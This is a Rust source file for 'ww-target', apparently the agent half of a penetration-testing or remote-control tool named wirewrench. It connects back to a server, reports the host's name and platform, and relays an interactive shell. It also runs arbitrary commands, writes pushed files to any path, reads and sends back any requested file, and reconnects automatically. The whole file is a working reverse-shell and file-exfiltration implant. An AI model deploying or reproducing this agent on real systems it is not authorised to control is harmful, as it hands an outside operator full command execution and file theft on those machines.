//! ww-target — smart agent for wirewrench.
//!
//! Connects to ww-server on the smart port (default 4446).
//! Uses a simple framed protocol: [type:u8][len:u32 LE][payload:len bytes].
//!
//! Frame types:
//!   0x01 SHELL      — shell stdin/stdout bytes
//!   0x02 HANDSHAKE  — initial identity exchange
//!   0x03 `FILE_CTRL`  — file transfer coordination (JSON)
//!   0x04 `FILE_DATA`  — raw file bytes (push)
//!   0x05 CANCEL     — abort file transfer
//!   0x06 HASH       — SHA-256 hash verification (JSON)
//!   0x07 KEEPALIVE  — heartbeat

use std::io::{BufRead as _, BufReader, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use core::time::Duration;

use anyhow::{Context as _, Result};
use clap::Parser;

use sha2::Digest as _;
use wirewrench::target::protocol::{FRAME_SHELL, FRAME_HANDSHAKE, Handshake, FRAME_FILE_CTRL, FRAME_CANCEL, FRAME_HASH, FRAME_KEEPALIVE, PushReady, FRAME_FILE_DATA, PushError, PushVerified, PullMeta, PushDone, FRAME_CMD, FRAME_CMD_RESULT, CmdRequest, CmdResult};

#[derive(Parser)]
#[command(name = "ww-target")]
struct Args {
    host: String,
    #[arg(short = 'p', long, default_value_t = wirewrench::DEFAULT_SMART_PORT)]
    port: u16,
    #[arg(short = 'P', long = "poll", default_value = "5.0")]
    poll_interval: f64,
    #[arg(short = 'n', long = "no-reconnect")]
    no_reconnect: bool,
    /// Override the shell used for interactive mode and command execution.
    /// Defaults to /bin/sh on Unix and %COMSPEC% (cmd.exe) on Windows.
    #[arg(long)]
    shell: Option<String>,
}

// ── Shell selection ────────────────────────────────────────────────────────

/// The shell used for the persistent interactive session and for
/// single-command execution (FRAME_CMD).
struct Shell {
    /// Program used for the persistent interactive shell.
    interactive_prog: String,
    /// Program + flag used to run a single command (`sh -c`, `cmd /C`, …).
    exec_prog: String,
    exec_flag: String,
}

impl Shell {
    fn spawn_interactive(&self) -> std::io::Result<std::process::Child> {
        Command::new(&self.interactive_prog)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    }

    fn spawn_cmd(&self, cmd: &str) -> std::io::Result<std::process::Child> {
        Command::new(&self.exec_prog)
            .arg(&self.exec_flag)
            .arg(cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    }
}

fn resolve_shell(explicit: Option<&str>) -> Shell {
    if let Some(prog) = explicit {
        let exec_flag = infer_exec_flag(prog);
        Shell {
            interactive_prog: prog.to_string(),
            exec_prog: prog.to_string(),
            exec_flag,
        }
    } else {
        default_shell()
    }
}

#[cfg(windows)]
fn default_shell() -> Shell {
    let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
    Shell {
        interactive_prog: comspec.clone(),
        exec_prog: comspec,
        exec_flag: "/C".into(),
    }
}

#[cfg(not(windows))]
fn default_shell() -> Shell {
    Shell {
        interactive_prog: "/bin/sh".to_string(),
        exec_prog: "/bin/sh".to_string(),
        exec_flag: "-c".into(),
    }
}

/// Guess the single-command flag for an explicitly provided shell program.
fn infer_exec_flag(prog: &str) -> String {
    let lower = prog.to_ascii_lowercase();
    if lower.contains("cmd") {
        "/C".into()
    } else if lower.contains("powershell") || lower.contains("pwsh") {
        "-Command".into()
    } else {
        "-c".into()
    }
}

/// Write bytes to the interactive shell's stdin, translating LF→CRLF on
/// Windows where cmd.exe expects carriage returns.
fn write_shell_input(stdin: &mut impl Write, payload: &[u8]) -> std::io::Result<()> {
    #[cfg(windows)]
    {
        let mut buf = Vec::with_capacity(payload.len() + 16);
        for &b in payload {
            if b == b'\n' && buf.last() != Some(&b'\r') {
                buf.push(b'\r');
            }
            buf.push(b);
        }
        stdin.write_all(&buf)?;
    }
    #[cfg(not(windows))]
    {
        stdin.write_all(payload)?;
    }
    stdin.flush()
}

/// Normalize CRLF→LF for command output on Windows so `ww send` results
/// match the Unix format.
#[cfg(windows)]
fn normalize_crlf(s: String) -> String {
    s.replace("\r\n", "\n")
}

#[cfg(not(windows))]
fn normalize_crlf(s: String) -> String {
    s
}

/// Resolve a best-effort hostname: HOSTNAME → COMPUTERNAME → `hostname` cmd.
fn detect_hostname() -> Option<String> {
    let from_env = std::env::var("HOSTNAME")
        .ok()
        .or_else(|| std::env::var("COMPUTERNAME").ok());
    if let Some(h) = from_env.filter(|s| !s.is_empty()) {
        return Some(h);
    }
    Command::new("hostname").output().ok().and_then(|out| {
        let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
        (!s.is_empty()).then_some(s)
    })
}

// ── Frame I/O ───────────────────────────────────────────────────────────────

fn write_frame(w: &mut impl Write, frame_type: u8, payload: &[u8]) -> Result<()> {
    w.write_all(&[frame_type])?;
    w.write_all(&u32::try_from(payload.len())?.to_le_bytes())?;
    if !payload.is_empty() {
        w.write_all(payload)?;
    }
    w.flush()?;
    Ok(())
}

fn read_frame(r: &mut impl Read) -> Result<(u8, Vec<u8>)> {
    let mut header = [0_u8; 5];
    r.read_exact(&mut header)?;
    let frame_type = header[0];
    let len = u32::from_le_bytes(header[1..5].try_into().unwrap()) as usize;
    let mut payload = vec![0_u8; len];
    if len > 0 {
        r.read_exact(&mut payload)?;
    }
    Ok((frame_type, payload))
}

fn write_json_frame(w: &mut impl Write, frame_type: u8, value: &impl serde::Serialize) -> Result<()> {
    let json = serde_json::to_string(value)?;
    write_frame(w, frame_type, json.as_bytes())
}

// ── Pipe forwarder ──────────────────────────────────────────────────────────

/// Spawn a thread that reads lines from `reader` and sends them as `FRAME_SHELL` packets.
fn spawn_pipe_to_frames<R>(reader: R, writer: impl Write + Send + 'static) where R: Read + Send + 'static {
    thread::spawn(move || {
        let mut reader = BufReader::new(reader);
        let mut w = writer;
        let mut buf = Vec::new();
        loop {
            buf.clear();
            match reader.read_until(b'\n', &mut buf) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    let _ = write_frame(&mut w, FRAME_SHELL, &buf);
                }
            }
        }
    });
}

// ── Session ─────────────────────────────────────────────────────────────────

fn run_session(stream: &TcpStream, shell: &Shell) -> Result<()> {
    stream.set_read_timeout(None)?;
    let mut reader = stream.try_clone()?;
    let mut writer = stream.try_clone()?;

    // ── Handshake ────────────────────────────────────────────────
    let hostname = detect_hostname();
    let platform = Some(format!("{}/{}", std::env::consts::OS, std::env::consts::ARCH));
    write_json_frame(&mut writer, FRAME_HANDSHAKE, &Handshake::new_client(hostname, platform))?;

    let (ftype, payload) = read_frame(&mut reader)?;
    anyhow::ensure!(ftype == FRAME_HANDSHAKE, "Expected handshake, got frame type {ftype}");
    let resp: Handshake = serde_json::from_slice(&payload)
        .context("Invalid handshake response")?;
    eprintln!("[+] Connected. Session ID: {}", resp.session_id.as_deref().unwrap_or("?"));

    // ── Spawn persistent shell ───────────────────────────────────
    let mut child = shell
        .spawn_interactive()
        .context("Failed to spawn interactive shell")?;

    let mut child_stdin = child.stdin.take().unwrap();
    let child_stdout = child.stdout.take().unwrap();
    let child_stderr = child.stderr.take().unwrap();

    // Threads: read shell stdout/stderr → send SHELL frames
    spawn_pipe_to_frames(child_stdout, writer.try_clone()?);
    spawn_pipe_to_frames(child_stderr, writer.try_clone()?);

    // ── Main loop: read frames from server ───────────────────────
    loop {
        let (ftype, payload) = match read_frame(&mut reader) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("[-] Read error: {e}");
                break;
            }
        };

        match ftype {
            FRAME_SHELL => {
                // Write to shell stdin
                if write_shell_input(&mut child_stdin, &payload).is_err() {
                    break;
                }
            }
            FRAME_FILE_CTRL => {
                let msg: serde_json::Value = match serde_json::from_slice(&payload) {
                    Ok(v) => v,
                    Err(e) => {
                        eprintln!("[-] Invalid FILE_CTRL JSON: {e}");
                        continue;
                    }
                };
                match msg["type"].as_str().unwrap_or("") {
                    "push_start" => {
                        let path = msg["path"].as_str().unwrap_or("").to_owned();
                        let size = msg["size"].as_u64().unwrap_or(0);
                        let expected = msg["hash"].as_str().unwrap_or("").to_owned();
                        if let Err(e) = handle_push(&mut reader, &mut writer, &path, size, &expected) {
                            eprintln!("[-] push error: {e}");
                        }
                    }
                    "pull" => {
                        let path = msg["path"].as_str().unwrap_or("").to_owned();
                        if let Err(e) = handle_pull(&mut writer, &path) {
                            eprintln!("[-] pull error: {e}");
                        }
                    }
                    _ => {}
                }
            }
            FRAME_CANCEL => {
                eprintln!("[!] Received cancel");
                // For now, just continue — the current push/pull handler will
                // fail when it can't read the expected frames
            }
            FRAME_CMD => {
                let req: CmdRequest = match serde_json::from_slice(&payload) {
                    Ok(r) => r,
                    Err(e) => {
                        eprintln!("[-] Invalid CMD request: {e}");
                        continue;
                    }
                };

                // Spawn a one-shot command — stateless, bounded output, exit code captured.
                let child = shell.spawn_cmd(&req.cmd);

                match child {
                    Ok(c) => {
                        let output = c.wait_with_output().unwrap_or_else(|_| {
                            std::process::Output {
                                status: std::process::ExitStatus::default(),
                                stdout: Vec::new(),
                                stderr: Vec::new(),
                            }
                        });
                        let result = CmdResult {
                            seq: req.seq,
                            exit_code: output.status.code().unwrap_or(-1),
                            stdout: normalize_crlf(String::from_utf8_lossy(&output.stdout).into_owned()),
                            stderr: normalize_crlf(String::from_utf8_lossy(&output.stderr).into_owned()),
                        };
                        let _ = write_json_frame(&mut writer, FRAME_CMD_RESULT, &result);
                    }
                    Err(e) => {
                        let result = CmdResult {
                            seq: req.seq,
                            exit_code: -1,
                            stdout: String::new(),
                            stderr: format!("Failed to spawn command shell: {e}"),
                        };
                        let _ = write_json_frame(&mut writer, FRAME_CMD_RESULT, &result);
                    }
                }
            }
            FRAME_HASH | FRAME_KEEPALIVE => {
                // Ignore (handled inside push/pull handlers for HASH)
            }
            _ => {
                eprintln!("[-] Unknown frame type: {ftype}");
            }
        }
    }

    // Clean up
    let _ = child.kill();
    let _ = child.wait();
    Ok(())
}

// ── Push handler ────────────────────────────────────────────────────────────

fn handle_push(reader: &mut TcpStream, writer: &mut TcpStream, path: &str, size: u64, expected: &str) -> Result<()> {
    // Acknowledge
    write_json_frame(writer, FRAME_HASH, &PushReady::new(path.to_owned()))?;

    // Read FILE_DATA frames until we have all bytes
    let data_cap: usize = size.try_into()?;
    let mut data = Vec::with_capacity(data_cap);
    while data.len() < data_cap {
        let (ftype, payload) = read_frame(reader)?;
        match ftype {
            FRAME_FILE_DATA => {
                data.extend_from_slice(&payload);
            }
            FRAME_CANCEL => {
                let _ = write_json_frame(writer, FRAME_FILE_CTRL,
                    &PushError::new(path.to_owned(), "Cancelled by server".into()));
                return Ok(());
            }
            FRAME_HASH => {
                // push_done — verify and respond
                let msg: serde_json::Value = serde_json::from_slice(&payload)?;
                if msg["type"] == "push_done" {
                    break;
                }
            }
            _ => {
                eprintln!("[-] Unexpected frame type {ftype} during push");
            }
        }
    }

    // Verify hash
    let mut h = sha2::Sha256::new();
    h.update(&data);
    let actual = format!("{:x}", h.finalize());

    if actual != expected {
        let _ = write_json_frame(writer, FRAME_FILE_CTRL,
            &PushError::new(path.to_owned(), format!("Hash mismatch: expected {expected}, got {actual}")));
        return Ok(());
    }

    // Write to disk
    if let Some(p) = std::path::Path::new(path).parent() {
        let _ = std::fs::create_dir_all(p);
    }
    if let Err(e) = std::fs::write(path, &data) {
        let _ = write_json_frame(writer, FRAME_FILE_CTRL,
            &PushError::new(path.to_owned(), format!("Write error: {e}")));
        return Ok(());
    }

    write_json_frame(writer, FRAME_HASH, &PushVerified::new(actual))?;
    eprintln!("[+] Received '{path}' ({expected})");
    Ok(())
}

// ── Pull handler ────────────────────────────────────────────────────────────

fn handle_pull(writer: &mut TcpStream, path: &str) -> Result<()> {
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => {
            let _ = write_json_frame(writer, FRAME_FILE_CTRL,
                &PushError::new(path.to_owned(), format!("Read error: {e}")));
            return Ok(());
        }
    };

    let size = data.len() as u64;
    let mut h = sha2::Sha256::new();
    h.update(&data);
    let hash = format!("{:x}", h.finalize());

    // Send metadata
    write_json_frame(writer, FRAME_FILE_CTRL, &PullMeta::new(path.to_owned(), size, hash.clone()))?;

    // Send file data in chunks
    for chunk in data.chunks(8192) {
        write_frame(writer, FRAME_FILE_DATA, chunk)?;
    }

    // Send done
    write_json_frame(writer, FRAME_HASH, &PushDone::new(hash))?;
    eprintln!("[+] Sent '{path}' ({size} bytes)");
    Ok(())
}

// ── Main ────────────────────────────────────────────────────────────────────

fn main() -> Result<()> {
    let args = Args::parse();
    let shell = resolve_shell(args.shell.as_deref());
    let addr = format!("{}:{}", args.host, args.port);
    loop {
        eprintln!("[+] Connecting to {addr} ...");
        match TcpStream::connect(&addr) {
            Ok(stream) => {
                if let Err(e) = run_session(&stream, &shell) {
                    eprintln!("[-] Session error: {e}");
                }
            }
            Err(e) => {
                eprintln!("[-] Connection failed: {e}");
            }
        }
        if args.no_reconnect {
            break;
        }
        thread::sleep(Duration::from_secs_f64(args.poll_interval.max(1.0)));
    }
    Ok(())
}
